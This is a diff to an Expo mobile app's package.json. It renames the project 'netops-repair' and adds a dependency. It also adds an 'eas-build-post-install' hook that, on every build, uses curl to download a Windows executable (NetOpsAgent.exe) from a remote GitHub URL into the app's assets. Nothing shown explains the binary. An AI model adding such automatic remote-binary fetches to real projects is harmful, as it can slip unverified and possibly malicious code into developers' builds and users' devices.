@@ -1,10 +1,11 @@
 {
-  "name": "mobile-app",
-  "version": "1.0.0",
+  "name": "netops-repair",
+  "version": "2.0.0",
   "main": "index.js",
   "dependencies": {
     "@expo/metro-runtime": "~57.0.5",
     "expo": "~57.0.6",
+    "expo-file-system": "~57.0.1",
     "expo-network": "~57.0.1",
     "expo-status-bar": "~57.0.1",
     "react": "19.2.3",
@@ -16,7 +17,8 @@
     "start": "expo start",
     "android": "expo start --android",
     "ios": "expo start --ios",
-    "web": "expo start --web"
+    "web": "expo start --web",
+    "eas-build-post-install": "mkdir -p assets/agent && curl -L -o assets/agent/NetOpsAgent.exe https://raw.githubusercontent.com/Annoyinghh/mobile-app/main/mobile-app/assets/agent/NetOpsAgent.exe"
   },
   "private": true
 }
